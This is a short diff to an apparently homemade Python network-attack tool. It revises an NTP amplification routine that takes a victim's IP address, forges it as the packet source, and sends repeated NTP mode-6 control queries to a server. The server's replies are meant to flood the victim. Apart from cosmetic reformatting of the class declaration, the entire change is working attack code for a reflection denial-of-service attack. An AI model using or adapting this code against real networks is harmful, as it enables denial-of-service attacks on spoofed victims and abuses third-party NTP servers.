@@ -8,7 +8,7 @@ from protocols.arp import ARP
 from network import Network
 import random
 
-class Attack():
+class Attack:
     def __init__(self, name):
         pass
 
@@ -36,7 +36,11 @@ class Attack():
     @staticmethod
     def ntp_amplification():
         dst_ip = input('Enter IP address to amplification: ')
-        pkt = IPv4(src_ip=dst_ip ,dst_ip='8.8.8.8').add_protocol(UDP(dst_port=123).add_protocol(NTP()))
+        pkt = IPv4(src_ip=dst_ip, dst_ip="192.168.1.149").add_protocol(
+            UDP(dst_port=123).add_protocol(
+                NTP(mode=6, opcode=1, sequence=10, association_id=0, data=b"system")
+            )
+        )
         for i in range(10):
             Network.send_and_received(pkt)
 
